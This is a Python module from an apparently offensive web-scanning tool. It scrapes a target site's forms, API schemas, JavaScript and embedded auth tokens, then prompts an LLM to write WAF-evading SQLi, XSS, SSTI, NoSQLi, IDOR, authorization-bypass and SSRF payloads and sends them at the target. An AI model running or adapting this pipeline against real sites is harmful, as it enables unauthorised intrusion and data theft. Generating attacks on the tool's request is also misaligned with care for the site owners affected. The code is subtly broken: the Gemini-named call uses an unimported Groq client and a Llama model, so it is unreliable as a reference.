"""
Feature 5: Context-Aware Payload Generator
--------------------------------------------
Instead of spraying generic wordlist payloads, this module downloads the
target's frontend source code (HTML, JS, GraphQL schemas), feeds it to
Gemini AI, and asks the AI to generate intelligent, context-specific
payloads based on the actual parameter names, data types, and technology stack.

Usage:
    from modules.context_payloads import ContextPayloadGenerator
    gen = ContextPayloadGenerator(gemini_api_key)
    payloads = gen.generate_for_target("https://target.com")
    # payloads = [{"url": "...", "param": "...", "payload": "...",
    #              "vuln_type": "...", "reasoning": "..."}]
"""

import requests
import urllib3
import random
import json
import re
import time
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings()

MODELS = ["gemini-2.5-flash", "gemini-1.5-pro", "gemini-1.5-flash"]




def _call_gemini(prompt, api_key):
    client = Groq(api_key=api_key)
    try:
        completion = client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama-3.1-8b-instant"
        )
        return completion.choices[0].message.content
    except:
        return None


class ContextPayloadGenerator:
    """
    Gathers intelligence about a target (forms, API schemas, JS source,
    GraphQL introspection, tech stack) and uses AI to generate targeted,
    high-quality payloads that are stealthy and contextually relevant.
    """

    def __init__(self, api_key):
        self.api_key = api_key
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.headers = {"User-Agent": self.ua, "Accept": "*/*"}

    def _log(self, msg):
        print(f"  [Context Payloads] {msg}", flush=True)

    def _collect_forms(self, base_url):
        """Extract HTML forms and their input fields."""
        forms = []
        try:
            r = requests.get(base_url, headers=self.headers, timeout=10, verify=False)
            # Find all forms
            form_blocks = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL | re.IGNORECASE)
            for i, form_html in enumerate(form_blocks):
                form = {"index": i, "inputs": [], "action": "", "method": "GET"}

                # Extract action and method
                action_match = re.search(r'action=["\']([^"\']+)', form_html)
                if action_match:
                    form["action"] = action_match.group(1)
                method_match = re.search(r'method=["\']([^"\']+)', form_html, re.IGNORECASE)
                if method_match:
                    form["method"] = method_match.group(1).upper()

                # Extract inputs
                inputs = re.findall(
                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']+)["\'])?[^>]*/?>',
                    form_html, re.IGNORECASE
                )
                for name, input_type in inputs:
                    form["inputs"].append({"name": name, "type": input_type or "text"})

                # Extract textareas
                textareas = re.findall(r'<textarea[^>]+name=["\']([^"\']+)', form_html, re.IGNORECASE)
                for name in textareas:
                    form["inputs"].append({"name": name, "type": "textarea"})

                # Extract select elements
                selects = re.findall(r'<select[^>]+name=["\']([^"\']+)', form_html, re.IGNORECASE)
                for name in selects:
                    form["inputs"].append({"name": name, "type": "select"})

                if form["inputs"]:
                    forms.append(form)
        except:
            pass
        return forms

    def _collect_api_schema(self, base_url):
        """Try to discover API schemas (GraphQL introspection, OpenAPI/Swagger)."""
        schemas = {}

        # GraphQL introspection
        gql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql"]
        introspection_query = {
            "query": """{
                __schema {
                    types {
                        name
                        fields {
                            name
                            type { name kind }
                            args { name type { name } }
                        }
                    }
                    mutationType { name fields { name args { name type { name } } } }
                    queryType { name fields { name args { name type { name } } } }
                }
            }"""
        }
        for ep in gql_endpoints:
            try:
                r = requests.post(
                    f"{base_url}{ep}", json=introspection_query,
                    headers=self.headers, timeout=5, verify=False
                )
                if r.status_code == 200 and "__schema" in r.text:
                    schemas["graphql"] = r.json()
                    self._log(f"Found GraphQL schema at {ep}")
                    break
            except:
                pass

        # OpenAPI/Swagger
        swagger_paths = ["/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs"]
        for path in swagger_paths:
            try:
                r = requests.get(f"{base_url}{path}", headers=self.headers, timeout=5, verify=False)
                if r.status_code == 200:
                    try:
                        spec = r.json()
                        if "paths" in spec or "openapi" in spec or "swagger" in spec:
                            schemas["openapi"] = spec
                            self._log(f"Found OpenAPI spec at {path}")
                            break
                    except:
                        pass
            except:
                pass

        return schemas

    def _collect_js_context(self, base_url):
        """Extract API calls, fetch patterns, and data structures from JavaScript."""
        js_context = {
            "api_calls": [],
            "fetch_patterns": [],
            "data_structures": [],
            "auth_patterns": [],
        }

        try:
            r = requests.get(base_url, headers=self.headers, timeout=10, verify=False)
            scripts = re.findall(r'<script[^>]+src="([^"]+)"', r.text)

            # Also extract inline script content
            inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
            all_js = "\n".join(inline_scripts)

            # Fetch external scripts (limit to first 5)
            for s in scripts[:5]:
                if not s.startswith("http"):
                    s = urljoin(base_url, s)
                try:
                    js_r = requests.get(s, headers=self.headers, timeout=5, verify=False)
                    if js_r.status_code == 200:
                        all_js += "\n" + js_r.text
                except:
                    pass

            # Extract fetch/axios/XMLHttpRequest patterns
            fetch_calls = re.findall(
                r'(?:fetch|axios\.\w+|\.ajax)\s*\(\s*["\']([^"\']+)["\']', all_js
            )
            js_context["fetch_patterns"] = list(set(fetch_calls))[:20]

            # Extract JSON-like object structures (parameter patterns)
            json_objects = re.findall(
                r'\{[^{}]*(?:"?\w+"?\s*:\s*(?:"[^"]*"|\d+|true|false|null))[^{}]*\}',
                all_js
            )
            js_context["data_structures"] = list(set(json_objects))[:10]

            # Extract authorization patterns
            auth_patterns = re.findall(
                r'(?:Authorization|Bearer|token|api[_-]?key|x-api-key)\s*[:\=]\s*["\']?([^"\';\s]+)',
                all_js, re.IGNORECASE
            )
            js_context["auth_patterns"] = list(set(auth_patterns))[:5]

            # Extract API route definitions
            api_routes = re.findall(r'["\']/(api|v[0-9]|rest)/[^"\']*["\']', all_js)
            js_context["api_calls"] = list(set(f"/{m}" for m in api_routes))[:20]

        except:
            pass

        return js_context

    def _detect_tech_stack(self, base_url):
        """Detect the target's technology stack from headers and response."""
        tech = {
            "server": "unknown",
            "framework": "unknown",
            "frontend": "unknown",
            "database_hints": [],
        }
        try:
            r = requests.get(base_url, headers=self.headers, timeout=10, verify=False)

            # Server
            tech["server"] = r.headers.get("Server", "unknown")
            tech["framework"] = r.headers.get("X-Powered-By", "unknown")

            body = r.text.lower()

            # Frontend framework detection
            if "react" in body or "__NEXT_DATA__".lower() in body:
                tech["frontend"] = "React/Next.js"
            elif "ng-app" in body or "angular" in body:
                tech["frontend"] = "Angular"
            elif "vue" in body or "__vue__" in body:
                tech["frontend"] = "Vue.js"
            elif "jquery" in body:
                tech["frontend"] = "jQuery"

            # Database hints from error messages or headers
            db_patterns = {
                "mysql": ["mysql", "mariadb"],
                "postgresql": ["postgresql", "postgres", "pgsql"],
                "mongodb": ["mongodb", "mongoose"],
                "sqlite": ["sqlite"],
                "mssql": ["microsoft sql", "mssql", "sqlserver"],
            }
            for db, patterns in db_patterns.items():
                if any(p in body for p in patterns):
                    tech["database_hints"].append(db)
        except:
            pass

        return tech

    def generate_for_target(self, base_url, max_payloads=15):
        """
        Full pipeline: collect intelligence, send to AI, get tailored payloads.

        Returns list of dicts:
        [{"url": "...", "param": "...", "payload": "...", "vuln_type": "...",
          "method": "GET/POST", "reasoning": "...", "confidence": "HIGH/MEDIUM/LOW"}]
        """
        if not self.api_key or "your_" in self.api_key:
            return []

        self._log(f"Collecting intelligence on {urlparse(base_url).hostname}...")

        # Phase 1: Intelligence gathering
        forms = self._collect_forms(base_url)
        schemas = self._collect_api_schema(base_url)
        js_context = self._collect_js_context(base_url)
        tech = self._detect_tech_stack(base_url)

        self._log(f"Gathered: {len(forms)} forms, {len(schemas)} schemas, "
                  f"{len(js_context['fetch_patterns'])} fetch calls, tech={tech['framework']}")

        # Phase 2: Build context for AI
        context = f"""TARGET: {base_url}
TECHNOLOGY STACK:
  Server: {tech['server']}
  Framework: {tech['framework']}
  Frontend: {tech['frontend']}
  Database Hints: {', '.join(tech['database_hints']) or 'none detected'}

HTML FORMS FOUND:
"""
        for form in forms[:5]:
            context += f"  Form (action={form['action']}, method={form['method']}):\n"
            for inp in form["inputs"]:
                context += f"    - {inp['name']} (type={inp['type']})\n"

        if schemas.get("graphql"):
            # Summarize GraphQL schema
            try:
                types = schemas["graphql"]["data"]["__schema"]["types"]
                user_types = [t for t in types if not t["name"].startswith("__")][:10]
                context += "\nGRAPHQL SCHEMA (user-defined types):\n"
                for t in user_types:
                    fields = t.get("fields") or []
                    field_names = [f["name"] for f in fields][:8]
                    context += f"  {t['name']}: {', '.join(field_names)}\n"
            except:
                pass

        if schemas.get("openapi"):
            context += "\nOPENAPI ENDPOINTS:\n"
            paths = schemas["openapi"].get("paths", {})
            for path, methods in list(paths.items())[:10]:
                for method, details in methods.items():
                    params = [p.get("name", "?") for p in details.get("parameters", [])]
                    context += f"  {method.upper()} {path} (params: {', '.join(params)})\n"

        if js_context["fetch_patterns"]:
            context += "\nJS FETCH/API CALLS:\n"
            for f in js_context["fetch_patterns"][:10]:
                context += f"  {f}\n"

        if js_context["data_structures"]:
            context += "\nJSON DATA STRUCTURES IN JS:\n"
            for d in js_context["data_structures"][:5]:
                context += f"  {d[:200]}\n"

        # Phase 3: Ask AI for context-aware payloads
        prompt = f"""You are an elite penetration tester. Based on the following intelligence about a target application, generate {max_payloads} highly targeted, context-aware exploit payloads.

{context}

RULES:
1. Each payload must be SPECIFIC to the parameters and technology you see above
2. If you see a "user_role" parameter, try privilege escalation (not generic SQLi)
3. If you see a "search" or "q" parameter, try XSS with event handlers relevant to the frontend framework
4. If you see GraphQL mutations, craft batching attacks or authorization bypass queries
5. If the backend is PHP, use PHP-specific injection syntax
6. If MongoDB hints are present, use NoSQL injection (e.g., {{"$ne": ""}})
7. For each payload, specify the EXACT parameter, method, and reasoning
8. Generate payloads for multiple vulnerability classes: SQLi, XSS, SSTI, NoSQLi, IDOR, AuthZ bypass, SSRF
9. Avoid obvious payloads that any WAF would block — use encoded or obfuscated variants

OUTPUT FORMAT (JSON array, no markdown):
[
  {{"param": "parameter_name", "payload": "the actual payload string", "vuln_type": "SQLi|XSS|SSTI|NoSQLi|IDOR|AuthZ|SSRF", "method": "GET|POST", "path": "/endpoint/path", "reasoning": "brief explanation", "confidence": "HIGH|MEDIUM|LOW"}}
]
"""

        self._log("Asking AI to generate context-aware payloads...")
        response = _call_gemini(prompt, self.api_key)

        if not response:
            self._log("AI failed to respond")
            return []

        # Parse the AI response
        try:
            cleaned = response.strip()
            if cleaned.startswith("```json"):
                cleaned = cleaned[7:]
            if cleaned.startswith("```"):
                cleaned = cleaned[3:]
            if cleaned.endswith("```"):
                cleaned = cleaned[:-3]
            cleaned = cleaned.strip()

            payloads = json.loads(cleaned)
            if not isinstance(payloads, list):
                payloads = [payloads]

            # Enrich with full URLs
            for p in payloads:
                path = p.get("path", "/")
                p["url"] = f"{base_url.rstrip('/')}{path}"

            self._log(f"Generated {len(payloads)} context-aware payloads")
            return payloads

        except json.JSONDecodeError:
            self._log("Failed to parse AI response as JSON")
            return []

    def test_payloads(self, payloads, success_indicators=None):
        """
        Execute the generated payloads against the target and
        return findings for any that succeed.
        """
        findings = []
        indicators = success_indicators or {
            "XSS": ["<script", "onerror=", "alert(", "javascript:"],
            "SQLi": ["syntax error", "mysql", "postgresql", "ora-", "sql"],
            "SSTI": ["49", "7777777", "config"],
            "NoSQLi": [],  # Logical bypass — check for auth bypass
            "SSRF": [],    # Needs OOB callback
        }

        for p in payloads:
            url = p.get("url", "")
            param = p.get("param", "q")
            payload = p.get("payload", "")
            method = p.get("method", "GET").upper()
            vuln_type = p.get("vuln_type", "UNKNOWN")

            try:
                h = {"User-Agent": self.ua}
                if method == "GET":
                    target = f"{url}?{param}={requests.utils.quote(payload)}"
                    r = requests.get(target, headers=h, timeout=8, verify=False)
                else:
                    r = requests.post(url, data={param: payload}, headers=h,
                                      timeout=8, verify=False)

                # Check for success indicators
                type_indicators = indicators.get(vuln_type, [])
                reflected = any(ind.lower() in r.text.lower() for ind in type_indicators)

                # Also check for interesting status codes
                is_interesting = (
                    (r.status_code == 500 and vuln_type in ["SQLi", "SSTI"]) or
                    reflected
                )

                if is_interesting:
                    findings.append({
                        "type": f"CONTEXT_AWARE_{vuln_type}",
                        "url": url if method == "POST" else target,
                        "severity": p.get("confidence", "MEDIUM") == "HIGH" and "HIGH" or "MEDIUM",
                        "confidence": p.get("confidence", "MEDIUM"),
                        "detail": f"Context-aware {vuln_type} payload hit. "
                                  f"Param: {param}, Status: {r.status_code}, "
                                  f"Reasoning: {p.get('reasoning', 'N/A')[:100]}",
                    })

            except Exception:
                pass
            time.sleep(0.3)

        self._log(f"Tested {len(payloads)} payloads, {len(findings)} hits")
        return findings
